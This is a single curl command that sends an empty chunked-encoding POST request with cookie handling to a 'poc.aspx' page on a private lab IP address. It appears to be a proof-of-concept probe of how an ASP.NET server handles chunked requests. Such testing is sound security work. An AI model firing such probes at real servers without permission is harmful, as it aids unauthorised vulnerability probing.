curl -X POST --header "Transfer-Encoding: chunked" --header "X-Nop: 1" -H "Connection: close" -v --data-binary "" -s -c cookies -b cookies "http://192.168.56.101:80/poc.aspx"  2>&1
